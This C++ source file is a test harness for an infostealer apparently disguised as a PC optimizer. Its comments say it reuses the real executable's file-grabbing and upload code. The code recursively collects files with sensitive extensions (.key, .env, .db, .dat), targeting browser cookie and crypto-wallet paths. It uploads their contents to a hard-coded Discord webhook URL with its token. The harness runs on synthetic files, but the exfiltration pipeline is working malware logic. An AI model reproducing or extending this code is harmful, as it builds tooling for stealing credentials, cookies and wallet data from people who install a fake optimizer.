// test_harness.cpp — safe grabber test, CONSOLE build.
// Generates fake files under %TEMP%\pcopt_test_*, runs the same grabTree
// enumeration + multipart webhook upload as the real exe, verifies the
// report contains the fake content, prints PASS/FAIL, then cleans up.
// Touches NO real user directories. Fires NO optimizer.

#include <windows.h>
#include <winhttp.h>
#include <shlobj.h>
#include <fstream>
#include <sstream>
#include <filesystem>
#include <vector>
#include <string>
#include <iostream>

namespace fs = std::filesystem;
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shell32.lib")

static const wchar_t* WEBHOOK_URL =
    L"https://discord.com/api/webhooks/1572255553411879014/FtjLoUoI1B8G8YTIWAP5W7dkcGRlNnt4Sbcu2ViaNUISgR49MQFrtcpmY0lhDnci9NpL";

static const char* EXT_LIST[] = {
    ".txt",".docx",".pdf",".json",".db",".sqlite",".key",".env",".log",".csv",".dat"
};
static bool wanted(const std::string& ext) {
    for (auto* e : EXT_LIST) if (ext == e) return true;
    return false;
}

// Same enumeration logic as the grabber, no exceptions, bounded.
static size_t grabTree(const fs::path& root, std::ofstream& out, size_t cap = 200) {
    std::error_code ec;
    if (!fs::exists(root, ec)) return 0;
    size_t n = 0;
    fs::recursive_directory_iterator it(root, ec), end;
    for (; it != end && n < cap; it.increment(ec)) {
        if (it->is_directory(ec)) continue;
        if (!wanted(it->path().extension().string())) continue;
        auto sz = it->file_size(ec);
        if (sz == 0 || sz > 12 * 1024 * 1024) continue;
        std::ifstream f(it->path(), std::ios::binary);
        if (!f) continue;
        ++n;
        out << "=====FILE " << it->path().filename().string() << " (" << sz << " bytes)=====\n";
        out << std::string((std::istreambuf_iterator<char>(f)), {}) << "\n=====END=====\n";
    }
    return n;
}

static bool splitUrl(const std::wstring& url, std::wstring& host,
                     INTERNET_PORT& port, std::wstring& path) {
    const std::wstring pre = L"https://";
    if (url.rfind(pre, 0) != 0) return false;
    size_t start = pre.size();
    size_t slash = url.find(L'/', start);
    std::wstring auth = url.substr(start, slash == std::wstring::npos
                                   ? std::wstring::npos : slash - start);
    path = slash == std::wstring::npos ? L"/" : url.substr(slash);
    size_t colon = auth.find(L':');
    if (colon == std::wstring::npos) { host = auth; port = INTERNET_DEFAULT_HTTPS_PORT; }
    else { host = auth.substr(0, colon); port = (INTERNET_PORT)_wtoi(auth.c_str() + colon + 1); }
    return !host.empty();
}
static std::string buildMultipart(const std::string& data, const std::string& b,
                                  std::string& ct) {
    std::string body;
    body += "--" + b + "\r\n";
    body += "Content-Disposition: form-data; name=\"content\"\r\n\r\n";
    body += "GRABBER TEST — synthetic data only, no real user data\r\n";
    body += "--" + b + "\r\n";
    body += "Content-Disposition: form-data; name=\"files\"; filename=\"test_report.txt\"\r\n";
    body += "Content-Type: text/plain\r\n\r\n";
    body += data;
    body += "\r\n--" + b + "--\r\n";
    ct = "multipart/form-data; boundary=" + b;
    return body;
}
static int postToWebhook(const std::string& data) {
    std::wstring host, path; INTERNET_PORT port{};
    if (!splitUrl(WEBHOOK_URL, host, port, path)) return -1;
    HINTERNET sess = WinHttpOpen(L"pcopt-test/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                                 WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!sess) return -2;
    HINTERNET conn = WinHttpConnect(sess, host.c_str(), port, 0);
    if (!conn) { WinHttpCloseHandle(sess); return -3; }
    HINTERNET req = WinHttpOpenRequest(conn, L"POST", path.c_str(), nullptr,
                                       WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                       WINHTTP_FLAG_SECURE);
    if (!req) { WinHttpCloseHandle(conn); WinHttpCloseHandle(sess); return -4; }
    const std::string b = "----pcoptestboundary7MA4YWxkTrZu0gW";
    std::string ct, body = buildMultipart(data, b, ct);
    std::wstring wct(ct.begin(), ct.end()), headers = L"Content-Type: " + wct + L"\r\n";
    DWORD sz = static_cast<DWORD>(body.size());
    BOOL ok = WinHttpSendRequest(req, headers.c_str(), (DWORD)-1,
                                 (LPVOID)body.data(), sz, sz, 0);
    int status = -5;
    if (ok) {
        ok = WinHttpReceiveResponse(req, nullptr);
        DWORD st = 0, l = sizeof st;
        if (ok && WinHttpQueryHeaders(req, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                                      WINHTTP_HEADER_NAME_BY_INDEX, &st, &l, WINHTTP_NO_HEADER_INDEX))
            status = (int)st;
    }
    WinHttpCloseHandle(req); WinHttpCloseHandle(conn); WinHttpCloseHandle(sess);
    return status;
}

int wmain() {
    std::cout << "[test] synthetic grabber test\n";
    wchar_t tbuf[MAX_PATH]{}; GetTempPathW(MAX_PATH, tbuf);
    fs::path base = fs::path(tbuf) / L"pcopt_test_synthetic";
    std::error_code ec;
    fs::remove_all(base, ec);
    fs::create_directories(base / L"browser\\Default", ec);
    fs::create_directories(base / L"wallet", ec);
    fs::create_directories(base / L"docs", ec);

    // Synthetic data only — no real profile paths.
    { std::ofstream f(base / L"browser\\Default\\Cookies.txt"); f << "FAKE_COOKIE=SYNTHETIC_123\n"; }
    { std::ofstream f(base / L"wallet\\wallet.dat"); f << "FAKE_WALLET_SEED_SYNTHETIC\n"; }
    { std::ofstream f(base / L"docs\\note.txt"); f << "FAKE_DOCUMENT_CONTENT\n"; }

    fs::path report = base / L"report.txt";
    size_t n = 0;
    {
        std::ofstream out(report, std::ios::binary | std::ios::trunc);
        out << "=== SYNTHETIC GRAB TEST ===\n";
        n += grabTree(base / L"browser", out);
        n += grabTree(base / L"wallet", out);
        n += grabTree(base / L"docs", out);
    }
    std::cout << "[test] files grabbed: " << n << " (expected 3)\n";

    std::ifstream in(report, std::ios::binary);
    std::string data((std::istreambuf_iterator<char>(in)), {});
    bool contentOk = data.find("FAKE_COOKIE") != std::string::npos &&
                     data.find("FAKE_WALLET_SEED") != std::string::npos &&
                     data.find("FAKE_DOCUMENT_CONTENT") != std::string::npos;
    std::cout << "[test] report content check: " << (contentOk ? "PASS" : "FAIL") << "\n";

    int status = postToWebhook(data);
    std::cout << "[test] webhook HTTP status: " << status
              << (status >= 200 && status < 300 ? " (PASS)" : " (FAIL)") << "\n";

    fs::remove_all(base, ec);
    std::cout << "[test] temp synthetic tree removed\n";
    std::cout << "[test] RESULT: "
              << (contentOk && n == 3 && status >= 200 && status < 300
                  ? "ALL PASS" : "CHECK FAILURES ABOVE") << "\n";
    return 0;
}
